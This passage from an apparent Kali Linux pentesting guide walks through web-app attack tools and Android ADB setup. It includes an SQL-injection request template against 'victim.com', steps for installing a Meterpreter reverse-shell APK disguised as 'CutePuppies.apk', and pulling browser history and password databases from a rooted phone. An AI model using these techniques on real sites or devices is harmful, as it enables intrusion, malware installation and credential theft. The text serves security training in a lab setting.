When the scan is done, Skipfish creates an entire html security report stored in the output directory that was selected. Simply open up a browser and view the index.html file located in the output directory to view the report:

![](Images/image00943.jpeg)

See the tool Wiki ([https://code.google.com/p/skipfish/wiki/SkipfishDoc](https://code.google.com/p/skipfish/wiki/SkipfishDoc)) for more information, especially on creating a dictionary website making Skipfish scans more effective.

![](Images/image00917.jpeg)

### SQLNinja

Overview: Microsoft SQL injection to GUI database access

Tool Author: Icesurfer

Tool Website: [http://sqlninja.sourceforge.net/](http://sqlninja.sourceforge.net/)

![](Images/image00944.jpeg)

SQLNinja exploits Microsoft SQL Injection vulnerabilities and provides remote access to the database including graphical access. A pretty feature rich tool, it can fingerprint the server, has multiple options for shells, integrates with Metasploit, brute forces passwords and even streams music!

SQLNinja’s configuration file (sqlninja.conf) can be modified to control how the program works. It apparently does not come with one by default, but there is an example one (sqlninja.conf.example.gz) located in the ‘/usr/share/doc/sqlninja/’ directory.

You can make your own too. Basically capture a login request with Burp, copy that into a text file called “sqlninja.conf”. Add the starting marker, “--httprequest_start--” to the beginning and “--httprequest_end--” at the end. Replace the key name you want to inject with the term “__SQL2INJECT__” as seen in the documentation help file:

--httprequest_start--

GET http://www.victim.com/page.asp?string_param=aaa';__SQL2INJECT__&other_param=blah HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.13) Gecko/20060418 Firefox/1.0.8

Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*

Accept-Language: en-us,en;q=0.7,it;q=0.3

Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7

Connection: close

--httprequest_end--

Once this is set, you can use the configuration file (-f sqlninja.conf) and other command switches for SQLninja to attack the target website. See the html help file located at ‘usr/share/doc/sqlninja/sqlninja-howto.html’  for full instructions.

![](Images/image00917.jpeg)

### SQLSUS

Overview: MySQL injection tool

Author: Jérémy Ruffet

Website:  [http://sqlsus.sourceforge.net/](http://sqlsus.sourceforge.net/)

![](Images/image00945.jpeg)

Sqlsus is an open source MySQL injection program, but also a takeover tool that can install a PHP backdoor on the target.

Basic Usage:

 Generate a config file by typing, “sqlsus -g config.cfg”

 Edit the config.cfg file with your target information:

 Type, “sqlsus config.cfg” to start the command shell environment.

 Enter, “help” to get a list of commands:

![](Images/image00946.jpeg)

 Type, “start” to begin testing.

![](Images/image00917.jpeg)

### Uniscan, Uniscan-gui

Overview: RFI, LFI and RCE vulnerability scanner

Tool Author: Douglas Poerschke Rocha

Tool Website: [http://sourceforge.net/projects/uniscan/](http://sourceforge.net/projects/uniscan/)

![](Images/image00947.jpeg)

Uniscan is a command line (uniscan) and Graphical User Interface (uniscan-gui) Local & Remote File Inclusion and Remote Command vulnerability scanner. This is a Swiss Army knife type tool as it fingerprints the target server, scans for files and directories, loads in multiple plugins, crawls the website pages and then tests the target for vulnerabilities and other interesting information. The Plugins really expand the capabilities of the program from gathering E-Mail addresses to scanning backup files for vulnerabilities.

The tool takes a while to run, especially when testing larger sites. 

Uniscan - Command line basic usage:

 Type, “uniscan -u http://[IP Address]/ -qweds”

![](Images/image00948.jpeg)

Uniscan - GUI basic usage:

 Type, “uniscan-gui” in a terminal

 Enter URL Hostname to scan

 Tick option boxes that you want

 Click, “Start scan”

![](Images/image00949.jpeg)

![](Images/image00917.jpeg)

### Vega

Overview: A Free & Open Source web app security tester

Tool Author: Subgraph

Tool Website:  [https://subgraph.com/vega/](https://subgraph.com/vega/)

![](Images/image00950.jpeg)

Vega is a Web Application vulnerability scanner and proxy.

To run a simple scan:

 Type, “vega” to start program

 Edit the scan depth preferences under Window > Preferences

 Then Scan > Start New Scan

 Enter the target URL (your Metasploitable VM IP Address)

 Select the modules you want the scanner to use

 Start scan

To perform an authenticated scan:

 See Identities: [https://subgraph.com/vega/documentation/Identities/index.en.html](https://subgraph.com/vega/documentation/Identities/index.en.html)

Found vulnerabilities are coded as to severity. When the scan is complete, you can view details of each issue along with examples and remediation suggestions:

![](Images/image00951.jpeg)

![](Images/image00917.jpeg)

### W3af

Overview: Web Application Attack and Audit Framework

Tool Author: Andres Riancho and the w3af team.

Tool Website: [http://w3af.org/](http://w3af.org/)

![](Images/image00952.jpeg)

W3af is a very impressive tool that scans for numerous vulnerabilities. It can also act as an attack platform running attacks like brute force and SQL injection. At the time of this writing this tool seemed to lock up when running in Kali 2.

Basic Usage:

 Type, “w3af” to start

 Select OWASP_TOP10 (or another profile)

 Enter Target URL

 Click the “Start Scan” button.

W3af will then begin scanning the page for vulnerabilities.

 Click “Log” menu tab to see current process.

 Click “Results” to see in-depth risk color coded scan results:

![](Images/image00953.jpeg)

 Click on “Exploit” tab

You will see a list of exploits on the left and a bunch of possible vulnerable pages in the middle window.

 Click on, “Local_File_reader” or one of the other exploits.

If a possible vulnerability exists it will highlight in the middle window. Notice when you clicked “Local_File_reader”, the “Local file inclusion vulnerability” item in the middle window becomes highlighted.

To see if an exploit works:

 Drag the exploit in the left window and drop it on top of the vulnerability in the middle window:

![](Images/image00954.jpeg)

If it works, you will get a shell in the right window:

![](Images/image00955.jpeg)

If not, simply try another combination. You can also try exploiting manually by clicking on an object in the middle window and clicking “Add”.

When you have a shell, double click on it for a list of available commands. Then list and execute payloads using “lsp” and “payload” commands.  Here is an example of the “payload users” command:

![](Images/image00956.jpeg)

![](Images/image00917.jpeg)

### WebScarab

Overview: A Man-in-the-Middle Pentesting/ Coding Utility

Tool Author: OWASP

Tool Website:  [https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project](https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)

![](Images/image00957.jpeg)

WebScarab is an intercepting Man-in-the-Middle proxy for coders and security testers. Though still useful, this tool is marked as no longer being maintained on the OWASP website and being replaced by OWASP ZAP.

1.  To start WebScarab, type, “webscarab” in a terminal.
2.  View Proxy settings - Click, “Proxy” tab, and then “Listeners”.
3.  Configure Iceweasel to use this proxy.
4.  Visit the Mutillidae webpage and login (admin/ adminpass).
5.  Click Summary tab to see overview:

![](Images/image00958.jpeg)

6.  Right click on one of the host lines (highlighted above), then click “show Conversation”
7.  Click “Raw” in both the top and bottom window:

![](Images/image00959.jpeg)

This gives you a nice HTML view of both the sent request and the response. If you go back into the Proxy setup, under Manual Edit and click “Intercept Requests” and “Intercept Responses” you will be able to intercept and change entered page values just as we did with Burp Suites Intercepting Proxy:

![](Images/image00960.jpeg)

WebScarab also has a nice XSS/ CRLF vulnerability tester built in.

8.  Click the “XSS/CRLF” menu tab:

![](Images/image00961.jpeg)

Notice that WebScarab automatically found that there are possible XSS/CRLF vulnerabilities in the login page!

9.  To verify, click one of the Suspected Vulnerabilities to select it and then click the “Check” button on the bottom of the page:

![](Images/image00962.jpeg)

Notice the login page is now listed under confirmed Vulnerabilities.

This was just a quick overview of some of WebScarab’s features. You may want to look at this tool more closely, or OWASPs newer tools, especially if you are also a developer. When done don’t forget to set the Iceweasel Network proxy setting back to default.

![](Images/image00917.jpeg)

### Webshag

Overview: Web Server Audit Tool

Tool Author: SCRT Information Security

Tool Website: [http://www.scrt.ch/en/attack/downloads/webshag](http://www.scrt.ch/en/attack/downloads/webshag)

![](Images/image00963.jpeg)

Webshag is a multi-threaded web server auditing tool that be used to crawl, scan or fuzz websites. This tool was present in the original Kali, but seems to have been removed in Kali 2.

Basic Usage:

 Type, “webshag-gui” to start

 Click on one of the tabs: PSCAN (Port Scan), INFO, SPIDER, USCAN, or FUZZ

 Enter Target Website IP Address

 Select any options that you want

 Click OK to begin scan

Webshag will automatically run the selected function against the target and return the results.

![](Images/image00917.jpeg)

### WebSlayer

Overview: Web App Brute Forcer and site scanner

Author: OWASP/ Edge-Security

Website:  [https://www.owasp.org/index.php/Category:OWASP_Webslayer_Project](https://www.owasp.org/index.php/Category:OWASP_Webslayer_Project)

![](Images/image00964.jpeg)

Listed as an OWASP “In-Active” project, WebSlayer is a GUI web app brute forcer, fuzzer and scanner. This tool was present in the original Kali, but seems to have been removed in Kali 2.

Here is a sample SQL injection attack against the Mutillidae Login Page:

 Start from Menu or “webslayer” in a terminal

 Intercept a login request (Like we did in Burp)

 Paste in the User Agent header information from request into “Headers”

 Put in string to attack in POST data, replace keyword (username) with “FUZZ”.

 Select Dictionary as payload type

 From Dictionary drop down, select “Injections/SQL.txt”

 Click “Start!” to begin attack

As seen below:

![](Images/image00965.jpeg)

When attack is done, click on “Attack Results” tab:

![](Images/image00966.jpeg)

This displays a color coded response as to which attacks worked and which ones failed.

![](Images/image00917.jpeg)

### WebSploit

Overview: WebSploit is a website attack framework that includes scanning and attack modules.

Author: Fardin Allahverdinazhand (0x0ptim0us)

Website:  [http://sourceforge.net/projects/websploit/](http://sourceforge.net/projects/websploit/)

![](Images/image00967.jpeg)

Works very similar to Metasploit, type “help” to see commands. Enter “Show module”’ to see available modules. Then when you find the one you want to try:

 Simply “use [module name]”

 Type, “show options”

 Then set options with “set [option]  [value]”

Let’s try this out with the PHPMyAdmin Login Page Scanner module.

1.  Type, “use web/pma”             
2.  Then type, “show options”
3.  Lastly, “set TARGET (Enter your Metasploitable IP Address)”
4.  Now, “run” the module.             

WebSploit quickly returns:

 ![](Images/image00968.jpeg)

The PHP MyAdmin page was found at “/phpMyAdmin/”.

 Type, “exit” to exit program

WebSploit includes a number of other modules including Wi-Fi and network attacks.

![](Images/image00917.jpeg)

### WhatWeb

Overview: Website Identification Scanner

Author: Andrew Horton

Website: [http://www.morningstarsecurity.com/research/whatweb](http://www.morningstarsecurity.com/research/whatweb)

![](Images/image00969.jpeg)

WhatWeb is a very fast web identification scanner that answers the question, “What is that Website?” According to the tool website it contains over 900 plugins that identifies services from version numbers to SQL errors.

Basic usage:

 Type, “whatweb [target website].com”

 Or enter, “whatweb -v [target website].com” for verbose output.

![](Images/image00970.jpeg)

![](Images/image00917.jpeg)

### WPScan

Overview: WordPress site vulnerability scanner.

Tool Author: WPScan Team (@erwan_lr, pvdl, @_FireFart_ & @ethicalhack3r)

Tool Website:  [https://sucuri.net](https://sucuri.net)

![](Images/image00971.jpeg)

The scanner to use if you have WordPress installs in your organization. Works fast and is very effective.

Basic Usage:

 wpscan --url [Website Addredd].com

See program help screen for full instructions and examples.

![](Images/image00917.jpeg)

### XSSer

Overview: GUI and command line XSS Detector/ Exploiter

Tool Authors: psy, epsylon

Tool Website: [http://xsser.sourceforge.net/](http://xsser.sourceforge.net/)

![](Images/image00972.jpeg)

XSSer is a framework that detects, reports and exploits XSS vulnerabilities. 

 Command Line: xsser --help

 GUI Interface: xsser --gtk

Basic Usage:

 Start GUI, “xsser --gtk”

 Click the “Wizard Helper” menu button

 Click “Start Wizard Helper”

Follow through the Wizard:

 Select #1, “I want to enter the URL”

 Entering IP address for your Metasploitable VM (ex. [http://192.168.1.68](http://192.168.1.68))

 Click “Next”

 Select, “I want to "crawl" all the links of the website of my target(s), to search as much vulnerabilities as possible.”

 Then, “connect directly to target”

 Select, “I want to inject XSS scripts without encoding.”

 And finally, “I want to inject a classic "alert" message box with a "md5 Hash" to certificate the vulnerability.”

You should then be presented with the screen below:

![](Images/image00973.jpeg)

Now, just click, “START Test!”

When finished you will be given a results page listing all the possible XSS vulnerable pages:

![](Images/image00974.jpeg)

![](Images/image00917.jpeg)

### The PenTesters Framework

Tool Creator: Dave Kennedy (ReL1K)

Tool Website:  [https://github.com/trustedsec/ptf](https://github.com/trustedsec/ptf)

Lastly, the PenTesters Framework (PTF) is a Python script that includes all of the common tools used for creating a penetration testing environment. The tool is created by TrustedSec CEO David Kennedy who also created the famous “Social Engineering Toolkit”. Currently the PTF is not included in the Kali 2 distribution, but might be added at a later date. Though the program is compatible with Kali Linux, it is a separate pentesting environment that could be installed alone. But some may enjoy the tools that come with it that are not included with the default Kali Install. None of this book relies on the unique tools located in PTF, and there does seem to be some minor bugs running it in Kali 2\. So I recommend you DO NOT install it until you are finished with the book tutorials or install  it in its own separate Kali VM. I have included it only as I thought some in the security would want to check it out. Creating a custom pentesting environment can be very handy.

The program is broken up into two parts:

1.  The PTF installer/manager that installs or updates modules
2.  The working directory (/pentest) which holds all of the tools for usage

The PTF install adds tools that you choose to the directory stated in the config file. Once the tools are installed from the PTF tool, you can then access them from the Install directory (/pentest) or by running the program from the command prompt.

Installing all PTF Modules

The install routine is setup to function like Metasploit and is organized to reflect the Penetration Testing Execution Standard (PTES), just git clone the framework to Kali as seen below. This is a new tool, and at the time of this writing there seemed to be some bugs in it. I know they will be ironed out in time, but until then I highly recommend installing only the modules that you want (explained in the next section) to reduce the risk of interfering with your Kali install.

To install all modules:

 git clone [https://github.com/trustedsec/ptf](https://github.com/trustedsec/ptf)

![](Images/image00975.jpeg)

 Next check the ./ptf/config/ptf.config settings:

![](Images/image00976.jpeg)

The Base Install Path of “/pentest” is where all the modules will be installed.

Now enter the following:

 ./ptf

 use modules/install_update_all

This starts PTF, and then the next command downloads and installs all of the modules and updates, if you only want to install some of the modules, see the next section. During module install you will prompted several times for input, work through the prompts. This can take quite a while (a few hours on a VM). When complete you should see this:

![](Images/image00977.jpeg)

Installing/ Updating Individual Modules

To install some or all of the attack modules in PTF:

 At the ptf> prompt type “help”:

Available from main prompt: show modules, show <module>, search <name>, use <module>

Inside modules: show options, set <option>,run

Additional commands: back, help, ?, exit, quit

Update or Install: update, upgrade, install

PTF functions just like Metasploit, you select a module that you want to install or update, and set options and run.

 Type, “show modules”

![](Images/image00978.jpeg)

 Select the module you want with the “use” command.

 For example, the new “Unicorn” PowerShell attack tool

 Display options with “show options”:

![](Images/image00979.jpeg)

 Then type “run” to install or update the tool:

![](Images/image00980.jpeg)

Exit the program and then run the tool you want:

![](Images/image00981.jpeg)

As mentioned at the time of this writing there seemed to be some minor issues between it and Kali 2, but in time I believe this might be an interesting addition to Kali and definitely to any pentester’s toolkit.

Web App Pentesting Wrap-up

In this section we introduced numerous web app security tools that come with Kali and saw their basic usage. Some of these tools are deprecated, but still functional and it is good to have knowledge of what is available. Hopefully you saw some new tools that you haven’t seen before, and I help they will make nice additions to your personal security testing toolkit.

These are just some of the basic techniques and tools to security test web applications. In all honestly, the only way to get proficient in doing this is to practice on your own. Basically all I have done here is covered very basic web application security and shown you a lot of tools. Find out what tools and techniques work best for you and use them. And remember, just because something works in a test environment doesn’t mean it will work 100% in the real world. During one test I remember a system where I scanned it with tools and found a “definitely” vulnerable service only to have joy turn to sorrow as the exploit simply failed to work. At this point you step back, re-asses the other possibilities and try again. In this case I was able to get access by finding a service that was protected by a weak password.

You need to know several different techniques and ways to look for vulnerabilities. Play around with Metasploitable on the easy level. And once you get good at this turn the security level up and try again. Notice what techniques still work, and what does not. There are numerous “vulnerable” VMs and security learning websites for you to practice and hone your skills, download them, and go for it. The more “tools” you have knowledge of, and techniques you know, the greater the chance of success.

Keep your target in mind when you plan your security test. A small company client with no web presence other than e-mail will need to be attacked via social engineering, phishing, Wi-Fi and possible physical intrusion attempts. The larger the entity usually the greater opportunity for intrusion attempts. Large companies will most likely have a lot more public facing devices. Think out of the box.

Over the years I have seen completely open security systems, building controls, IP video and audio systems. And this will only grow as the rush to bring everything on line (the Internet of Things) continues with full fury. For instance, I have even seen large internet enabled office fish aquarium control systems completely open to the outside world. And with basically a Linux server in every online device, the opportunities will be almost limitless.

Finally, if you do plan on doing penetration tests professionally always make sure the scope of your intrusion attempts, what is fair game and what is out of bounds, is clearly stated in your written contract and verbally explained and agreed upon with your client.

# Attacking Smart Devices

## Chapter 26

## Installing Android SDK & Creating a Virtual Phone

Mobile devices and tablets in the enterprise are all the rage. Called “BYOD”, or Bring Your Own Device this influx of mobile devices add a whole different level of challenges for IT support staff.

 Protecting your network from BYOD threats

 Data Security and Privacy

 Vast range of new device makes and models to support

 Securing and patching these devices

These are just a few of the concerns enterprise and small to medium size businesses are facing. As Android is one of the most popular platforms for BYOD devices, in this section we will cover how to connect to them with Kali and perform some basic security tests.

### Installing the Android SDK

To connect Android devices to Kali, we will need to install the Android SDK. Once this is installed we will be able to create emulated Android systems and also communicate with physical devices. To get the latest version of the Android SDK, we will download it from the developer site.

1.  Open an internet browser in Kali and surf to: “[https://developer.android.com/sdk/index.html](https://developer.android.com/sdk/index.html)”

2.  Download the latest Android SDK Tools for Linux:

![](Images/image00982.jpeg)

3.  Accept the terms and conditions.
4.  Then instead of saving the file, select “Open file with Archive Manager”
5.  Leave the default location and click “Extract”:

![](Images/image00983.jpeg)

6.  And then click “Extract” again.

You will now have an “android-sdk-linux” directory in the root folder of your kali system.

7.  “cd” to the directory and “ls” the files:

root@kali:~# cd android-sdk-linux/

root@kali:~/android-sdk-linux# ls

add-ons  platforms  SDK Readme.txt  tools

As you can see the following directories are created during the install:

 Add-ons

 Platforms

 SDK

 Tools

And that is it; we now have the Android SDK installed. With the standard install, the Add-ons directory will be empty. This will change as we add new platforms and features using the Android Manager console found in the tools directory.

### Using the Management Console

Now that we have Android SDK installed, let’s take a look at a couple of the features. The first thing we will want to do is start the Android SDK Manager. This will allow us to get any updates to the SDK and to install new features to the standard install.

Before we do this, let’s take a quick look at the “tools” directory:

![](Images/image00984.jpeg)

The two main programs that we will be concerned with here are “android”, which is the Android SDK manager and the “emulator” files (32 and 64 bit) which allows us to use the emulator to run virtual android devices.

If we run the “android” file it will start the Manager GUI, or we can provide command line switches to run it from the command prompt. We will look at that later, for now let’s take a look at running it from the GUI:

1.  Change to the tools directory, “cd tools”
2.  Type, “./android”:
3.  The GUI will then open:

![](Images/image00985.jpeg)

You will then see a list of packages that are available on the left side and their revision level and status on the right. To add or remove packages simply click or unclick the checkmark next to their name.

The SDK manager usually comes with at least one API installed by default. But as you can see below there are numerous Android versions available:

![](Images/image00986.jpeg)

If you want to play with different versions of the Android API (and different smartphone emulators) all you need to do is just check the Android version that you want installed.

![](Images/image00987.jpeg)

### Installing Different Android Versions

For example, let’s add a 4.0.3 version and 2.2 as shown below:

1.  Select “Android 4.0.3” and “Android 2.2”:

![](Images/image00988.jpeg)

2.  Then click the “Install X packages” button at the bottom right of the manager:

![](Images/image00989.jpeg)

3.  Click “Accept License” and then, “Install”

The manager will then update and install the new packages that we have selected. This could take a while, so it is a good time to grab some coffee! When the initial install is done, it will probably say that there are more files to download. Just repeat accepting the license and downloading updates until all are installed, then exit the program.

Starting an Emulator

Now that we have several APIs loaded, the ones that come pre-installed and the two new ones that we added, let’s go ahead and start up an Android emulator session.

1.  From a terminal enter, “export ANDROID_EMULATOR_FORCE_32BIT=true”
2.  From a terminal enter, “./android”:

![](Images/image00990.jpeg)

3.  Click, “Tools” from the menu and then “Manage AVDs…”

![](Images/image00991.jpeg)

4.  At the Android Virtual Device (AVD) Manager screen click “Create”. This brings up an AVD creation page that we will need to fill in.

![](Images/image00992.jpeg)

1.  Click in the “AVD Name” field and enter a name. I usually include the API level in the name (Like Android 4.0) so that you can tell what they are by just looking at the AVD name. You can put in anything you want, but for now let’s use “Android_4.0.3”
2.  Click on the double arrows in the Device box and select the device you want to run on. There are multiple tablets and smartphones to choose from. Select “5.1” WVGA”.
3.  Change the Target to “Android 4.0.3 – API Level 15” by clicking on the double arrows and selecting it from the list.
4.  Set CPU/ABI to “ARM (armeabi-v7a)” 
5.  Change the Skin box to “No Skin”
6.  IMPORTANT - Change the VM Heap to “32”
7.  For Back Camera, choose “emulated”
8.  Lastly, set the SD Card size to 10 Mib

Your AVD creation screen should now look like this:

![](Images/image00993.jpeg)

9.  Once everything is set, just click, “OK” to create the AVD.

The AVD will be created and you will see a status screen like the one below:

![](Images/image00994.jpeg)

10.  Click “OK” and you will be returned to the AVD Manager screen.
11.  Now click on the AVD that we created, and then click “Start”:

![](Images/image00995.jpeg)

12.  At the Launch screen, just click “Launch”.

![](Images/image00996.jpeg)

After a short delay you will see an Android boot screen and then an emulated Android device will appear on the screen (on first boot the AVD might sit and the “Android” load screen for a long time). You will then get the welcome screen:

![](Images/image00997.jpeg)

Click “OK” and hit the app button (bottom, center) to see all your apps:

![](Images/image00998.jpeg)

Congratulations, you now have an Android device running on your Kali system! Take a while and play around with it, we will get into attacking it later after we discuss connecting your own smart phone to Kali. Notice the title of the virtual phone, “5554:Android_4.0.3” – The “5554” is the phone number (all Emulated phones start with 1-555-521-XXXX) and “Android_4.0.3” is the name of the virtual device. You can exit the AVD by clicking the “X” at the top of the screen, then hit “esc” to get out of the AVD Manager, and finally exit Android SDK.

Using your own Smart Phone in Kali

Working with virtual smartphones is fun, but what if we want to connect our real phone to Kali? In this chapter we will learn how to connect our Android smartphone to Kali Linux using a USB cable. In doing so we will be able to communicate and copy data back & forth to our phone

For this section you will need an Android phone and a USB cable to connect the phone to your system running Kali. The cable you will need should have come with your phone. If it did not, usually any USB cable with the correct ends will work, but double check with your manufacturer to see if your phone uses a proprietary cable.

![](Images/image00999.jpeg)

Enabling USB Debug Mode

The first thing we need to do is enable USB debug mode on our phone.

1.  Open “Settings” in your phone apps.

![](Images/image01000.jpeg)

2.  Under the SYSTEM heading select “Developer options”.

Some manufacturers are beginning to hide Developer Options, if it is not found under the System tab, check with your manufacturer for instructions on enabling it.

3.  Next, enable “USB debugging” mode by clicking the checkbox.

![](Images/image01001.jpeg)

4.  Select, “OK” at the “Allow USB Debugging?” warning message.
5.  Now, connect your Android device to your Kali computer using a USB cable.
6.  At the “Turn on USB storage” message that pops up on your phone, click “OK”.

If you are running Kali in a Windows Virtual Machine environment and have ‘Autoplay’ enabled you will see this message:

![](Images/image01002.jpeg)

Your phone connects as a USB flash drive and you can access files on the phone. Opening the new drive that is created (Drive E: on my system) allows you to view data on the phone:

![](Images/image01003.jpeg)

If you are using Kali in a Windows VMWare virtual machine you will see a message like the one below:

![](Images/image01004.jpeg)

7.  Select “OK” on the Removable Devices screen.
8.  Now in the Kali Virtual Machine Menu, click “Player” and then “Removable Devices”:

![](Images/image01005.jpeg)

9.  Under “Removable Devices”, find your phone (called KYOCERA USB Modem on mine) and click “Connect (Disconnect from host)”.

![](Images/image01006.jpeg)

10.  At the “A USB device is about to be unplugged from the host…” warning click, “OK”.

We can now communicate with the Android device directly through the USB port. But first, let’s make sure that the Android manager can see our device.

1.  Surf to the directory where you installed the Android SDK.
2.  Enter the “platform-tools” directory.

![](Images/image01007.jpeg)

3.  Run “./adb devices”:

![](Images/image01008.jpeg)

If everything worked correctly you will see your phone listed as an attached device.

Troubleshooting Connectivity

If it does not show up there are a couple things you can try:

 Turn off USB Debugging, connect the phone, and then turn USB Debugging back on.

 It could be a USB cable issue.

 Try stopping and restarting the ADB server using “./adb kill-server” and “./adb start-server”.

 Some devices have a problem running as both a flash drive and in USB debugging mode. Check your device manual to see how to turn off media sharing.

 Finally it could be a USB driver issue (especially with Nexus devices). Check Android’s website and the Google Android forums for more information.

Communicating with the Device

You can now communicate to the device or an emulator session using the Android Debug Bridge (ADB) command. ADB allows you to multiple functions including sending files to and from the device, and install and remove packages.

 Type, “./adb help” for a list of available commands:

![](Images/image01009.jpeg)

You can also visit the android developer website for adb at:

[http://developer.android.com/tools/help/adb.html](http://developer.android.com/tools/help/adb.html).

 To start a Remote Terminal just type “./adb shell”

You can now issue commands directly to the device like any other Linux remote shell. For instance, let’s just run the “ls” command:

![](Images/image01010.jpeg)

As can be seen in the image above, we did indeed connect to the device, an Android smartphone in this instance and were able to do a directory listing. To exit the remote session just type “exit”.

Other commonly used commands include:

 adb push - Copies a file or directory to device

 adb pull - Copies a file or directory from device

 adb install - Copies and installs application file to device

 adb uninstall - Removes application from the device

Connecting to an Emulated Android Device with ADB

Now that we know how to use the .adb command, we can run this against one of our emulated Android devices that we created in the beginning of the chapter. Simply start the Emulated Android device in the AVD manager. While it is running, open a second terminal prompt and surf to the android sdk “platform-tools” directory.

You can then view the device by typing “./adb devices”

And connect to it with “./adb shell” as seen below:

![](Images/image01011.jpeg)

You can now directly interact with the emulated device with adb!

Installing an App using ADB

You can install an application to a device through ADB. This can be a quick way to install security tools or the Meterpreter Msfvenom .apk shell that we will create shortly. Normally the easiest way to install an app on an Android device when it is connected to the Android SDK is through the “adb install [app_name.apk]” command:

![](Images/image01012.jpeg)

And that is it; the app is now installed on the Android device and ready to use.

I said it’s “normally the easiest way” because you can run into some problems if the phone requires that the .apk file be certificate signed and you are trying to install a Metasploit shell that isn’t. On some devices you can turn off “verify security certificates” in the security settings. But on other devices, the unsigned app will just not install.

For example, if we try to install this Meterpreter Android Reverse Shell called “CutePuppies.apk” on one of the AVD Emulated Android devices we get this error:   

![](Images/image01013.jpeg)

“Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES]” - The Metasploit APK file is not certificate signed, so the Android device cannot determine the validity of the app and will not install it.

We are in Developer Mode, so we should be able to force the app to install. I spent a large amount of time researching this and found that the Android SDK apparently does not install the “Android Developer” certificate that seems to be installed if you use the full blown Android Studio or Eclipse Project management program.

So all that needs to be done is to create the Android Developer certificate key on your Kali system and then self-sign your exploit with the developer key! I am not sure why Google did not include this feature in the SDK. And with all the recent news about fake certificates I will not include the step by step instructions on doing this in the book. I will say though that the forum comments in these two websites were very helpful in one, creating the “Android Debug” self-signed Certificate and two, signing our payload app with the newly created certificate:

1.  [http://stackoverflow.com/questions/2194808/debug-certificate-expired-error-in-eclipse-android-plugins/2196397#2196397](http://stackoverflow.com/questions/2194808/debug-certificate-expired-error-in-eclipse-android-plugins/2196397#2196397)
2.  [https://github.com/rapid7/metasploit-javapayload/issues/21](https://github.com/rapid7/metasploit-javapayload/issues/21)

Once the CutePuppies.apk Metasploit shell was self-signed, it installed with no issues:

![](Images/image01014.jpeg)

The App shows up on the emulated device. Metasploit Android Shells are called “MainActivity”:

![](Images/image01015.jpeg)

And when run connects to our Kali system and creates a session:

![](Images/image01016.jpeg)

We successfully installed an Android .apk shell through ADB and connected to it with Kali. We will cover how to make the actual Meterpreter Android Reverse Shell app in an upcoming chapter. I just wanted to show you how to install apps via ADB and what to do if you run into issues.

## Chapter 27

## Rooting and ADB Usage

To root or not to root, that is the question. Rooting your device gives “root” or administrator rights to the user. On most smartphones and many tablets the user is not allowed to use root access. It is locked out, adding extra security to the device. If you do not have root access there are many system level, settings and secure areas of the device that are off limits to the user. With root access you can access, view and even modify these areas.

If a hacker accesses a non-rooted phone, there are only limited areas that they will be able to access, limiting your damage and loss. The hacker would need to try a privilege escalation attack to try to gain root access to your device.

If a hacker accesses a rooted phone, they basically have the keys to the castle and will be able to access most, if not all, the data and settings on your device. This includes accessing your phone logs and text messages. The hacker may also be able to install his own malware onto your device acting as a remote spy or worse, use your device to attack other devices.

I do not recommend rooting your device, especially in a BYOD environment. As such, I will not show how to root your Android. If you understand the risks and still want to do so, there are many tutorials and utilities available. In this section we will learn how to connect to an Android device and view system files and databases that are only accessible when the unit is rooted. We will also see why it isn’t a good idea to root your smart device! As we already have the Android SDK installed, I will focus on Android in this chapter. But using different software you can also access similar databases on Apple devices.

What is Rooting?

Smart devices ship without administrator access enabled. The user runs in a permission restricted environment to help protect the system from security threats, and user indiscretion. As the manufacturer usually does not want the user to have administrator rights, rooting usually consists of downloading modified ROM software or running special software that will allow root access to your device.

First of all there are legal issues, rooting certain devices is illegal in some countries. Then there are the security issues, allowing root access to your device negates a lot of built in security that defends your device from malicious attackers - the device doesn’t have root for a reason! You most likely will void any device warranty you have. And lastly, you could brick your device (translation – make it into an expensive doorstop). So if you are still thinking of doing it - don’t.

Okay, so you are determined to do this. Sometimes you actually need root access to your device – some program or specialized application requires it. Or you are interested in the speed gain that some modified ROM firmware’s can provide. There are many ways to do it, some very easy, some have numerous steps depending on the device. Again, I do not recommend rooting your device and if you choose to do so you accept all the risks. If you still want to proceed, all I will say is that Google is your friend.

Below is an example of a modified ROM being installed on an Android device:

![](Images/image01017.jpeg)

Viewing Protected Databases

Once your device is rooted, you will have access to protected system databases that are normally inaccessible. We will simulate this by connecting to the Android device via USB and using Developer Mode. Developer Mode allows you to connect your Android device to the Android SDK program on Kali and allows you to manipulate or transfer data between the two. Make sure Developer Mode is enabled on your Android device and connect it to Kali via USB cable. In the Android Platform-Tools directory:

 Type, “./adb devices” to list your android device:

![](Images/image01018.jpeg)

 And then type, “./adb shell” to get a remote shell:

![](Images/image01019.jpeg)

We now have access to the Android device. And since the device is rooted, we can get to the Holy Grail “data/data” directory that is normally protected:

 Change to the “/data/data” directory

 List the directory contents:

![](Images/image01020.jpeg)

Here we see the system databases for all the installed programs. Inside each directory are data files for these programs. If we pick one, say “com.android.browser”, we can view the contents of the Browser data:

![](Images/image01021.jpeg)

The Browser Database - Surfing History and Passwords

Notice the names of the sub-directories. Some of these could hold some very important information. Let’s check out the databases directory:

 Change to the “com.android.browser/databases” directory.

 And then list the contents:

root@android:/data/data/com.android.browser/databases # ls

autofill.db

autofill.db-journal

browser2.db

browser2.db-shm

browser2.db-wal

webview.db

webview.db-shm

webview.db-wal

webviewCookiesChromium.db

webviewCookiesChromiumPrivate.db

Some interesting sounding files there, let’s pull the whole Browser directory over to Kali and analyze it. We can do this using the “./adb pull” command. Just use the command followed by the file or folder you want to download.

In this case, let’s grab all of the files in the databases directory.

 Exit the shell by typing “exit”

 And then type, “./adb pull /data/data/com.android.browser/databases”

This will download the files to our Kali system as seen below:

![](Images/image01022.jpeg)

Once we have downloaded the database files, we can open and view them in Kali. Just run the sqlite3 program with the name of the database file you want to view. Let’s check out the browser2 database file:

![](Images/image01023.jpeg)

If you are not familiar with SQLite you may be a bit lost at this point. When we run SQLite it just gives us a “sqlite>” prompt, and brief instructions – “Enter “.help” for usage hints”. We also need to terminate SQLlite statements with a “;”.

Typing “.help” will return the help file:

![](Images/image01024.jpeg)

It includes a lot of commands, but we just need to know a few.

 “.tables” will return all the tables in the database:

![](Images/image01025.jpeg)

And the “SELECT * FROM [table]” command will show us the contents of the table. Let’s check and see what is in the “history” table.

